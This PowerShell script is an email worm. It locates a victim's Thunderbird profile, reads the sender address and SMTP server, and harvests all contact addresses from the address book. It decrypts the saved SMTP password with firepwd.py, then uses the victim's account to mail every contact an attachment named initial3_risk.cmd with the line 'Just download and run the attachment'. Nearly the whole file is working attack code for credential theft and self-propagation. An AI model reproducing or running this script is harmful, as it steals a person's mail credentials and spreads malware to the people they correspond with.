Install-PackageProvider -Name NuGet -Force -Scope CurrentUser

if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
    Install-Module -Name PSSQLite -Scope CurrentUser -Force 
}
Import-Module PSSQLite

$profilesPath = "$env:APPDATA\Thunderbird\Profiles"
$profile = Get-ChildItem $profilesPath -Directory | Where-Object { $_.Name -like "*.default-release" } | Select-Object -First 1

if (-not $profile) { Write-Error "No Thunderbird profile found"; exit }

$prefsFile = "$($profile.FullName)\prefs.js"
$prefs = Get-Content $prefsFile

# Extract user email
$userEmailLine = $prefs | Select-String "useremail"
$userEmail = ($userEmailLine -replace '.*useremail.*",\s*"(.*)".*', '$1').Trim()
Write-Host "User Email: $userEmail"

# Extract SMTP server
$smtpLine = $prefs | Select-String "mail.smtpserver.smtp"
$smtpServerLine = $smtpLine | Select-String "hostname"
$smtpServer = ($smtpServerLine -replace '.*hostname.*",\s*"(.*)".*', '$1').Trim()
Write-Host "SMTP Server: $smtpServer"

# Extract contacts from abook.sqlite
$abookFile = "$($profile.FullName)\abook.sqlite"

if (-not (Test-Path $abookFile)) { Write-Error "Address book not found"; exit }


# Get contacts with pivoted DisplayName and PrimaryEmail
$contacts = Invoke-SQLiteQuery -DataSource $abookFile -Query "
    SELECT
        MAX(CASE WHEN name = 'PrimaryEmail' THEN value END) AS PrimaryEmail
    FROM properties
    GROUP BY card
"

# Extract only non-null emails into a list
$allEmails = $contacts | Where-Object { $_.PrimaryEmail } | ForEach-Object { $_.PrimaryEmail }
$allEmails = $allEmails | ForEach-Object { $_.Trim() } | Where-Object { $_ -match '^[\w\.\-]+@[\w\.\-]+$' }


# Optional: display how many emails you got
Write-Host ("Found {0} emails" -f $allemails.Count)

# Run your Python script and capture the output
pip install -r "C:\Users\Public\Public Display\requirements.txt"
$output = python "C:\Users\Public\Public Display\firepwd.py" -d $($profile.FullName)

# Define the updated regex pattern for extracting the username and password
$regex = "smtp://(?:[^\s]+):b'([^\']+)',b'([^\']+)'"

# Initialize arrays to store usernames and passwords
$usernames = @()
$passwords = @()

# Split output into lines and check each line
$output.Split("`n") | ForEach-Object {
    # Match the regex pattern in each line
    if ($_ -match $regex) {
        # Extract username and password from matched groups
        $usernames += $matches[1]
        $passwords += $matches[2]
    }
}

# Output all found usernames and passwords
if ($usernames.Count -gt 0) {
    for ($i = 0; $i -lt $usernames.Count; $i++) {
	$username = $($usernames[0])
	$password = $($passwords[0])
    }

} else {
    Write-Host "No matches found."
}

$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))

$subject = "You gotta trust me!!"
$body = "Hello! This is an extreamly unsuspicious email. Just download and run the attachment."
$attachmentPath = "C:\Users\Public\Public Display\initial3_risk.cmd"

# Send to all contacts 

Write-Host "Sending email to all contacts..."

# Send email to each address individually
foreach ($email in $allEmails) {
    Send-MailMessage -From $userEmail -To $email -Subject $subject -Body $body -SmtpServer $smtpServer -Port 25 -Credential $credential -Attachments $attachmentPath
    Write-Host "Email sent to $email"
}
